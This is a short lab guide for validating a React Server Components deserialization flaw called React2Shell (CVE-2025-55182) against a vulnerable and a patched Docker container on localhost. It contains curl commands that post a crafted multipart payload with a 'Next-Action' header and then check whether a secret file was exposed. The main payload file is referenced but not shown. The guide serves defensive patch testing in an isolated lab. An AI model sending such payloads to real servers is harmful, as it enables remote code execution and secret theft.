# Proof of Concept (PoC) & Vulnerability Validation Guide
**Target Vulnerability:** React2Shell / RSC Deserialization (CVE-2025-55182)  
**Environment:** Container Isolated Docker Lab (`vulnerable-app` vs `patched-app`)

## Lab Architecture
- **Network Scope:** Localhost loopback (`127.0.0.1`) only; isolated bridge network.
- **Vulnerable Target:** `http://127.0.0.1:3001` (`container: react2shell-vulnerable`)
- **Patched Target:** `http://127.0.0.1:3002` (`container: react2shell-patched`)
- **Secrets Management:** Dummy environment variables (`DUMMY_SECRET`) applied inside containers.

Before running validation tests, purge all lingering artifact files from both containers to prevent false positives/negatives during assessment.

## Environment Setup
### Start the Lab Infrastructure
Navigate to the lab/ directory and initialize both dual-build containers:
```bash
cd lab
docker-compose up -d --build
```

### Environment Cleanup
```bash
# 1. Remove existing marker artifacts from both containers
docker exec react2shell-vulnerable rm -f /app/public/exposed_secret.txt
docker exec react2shell-patched rm -f /app/public/exposed_secret.txt

# 2. Verify baseline state 
curl -i http://127.0.0.1:3001/exposed_secret.txt
curl -i http://127.0.0.1:3002/exposed_secret.txt
```

### Payload Setup
```bash
cd poc
```
### PoC Execution
#### 1. Test Vulnerable Container
```bash
# Create payload2.txt (Only need to do once)
echo -n '"$@0"' > payload2.txt

# Send payload to container Vulnerable
curl -i -X POST http://127.0.0.1:3001/ \
  -H "Next-Action: dontcare" \
  -F "0=<payload.json" \
  -F "1=<payload2.txt"

# check state
curl -i http://127.0.0.1:3001/exposed_secret.txt
```
#### 2. Test Patched Container
```bash
# Create payload2.txt (Only need to do once)
echo -n '"$@0"' > payload2.txt

# Send payload to container Patched
curl -i -X POST http://127.0.0.1:3002/ \
  -H "Next-Action: dontcare" \
  -F "0=<payload.json" \
  -F "1=<payload2.txt"

# Check state
curl -i http://127.0.0.1:3002/exposed_secret.txt
```


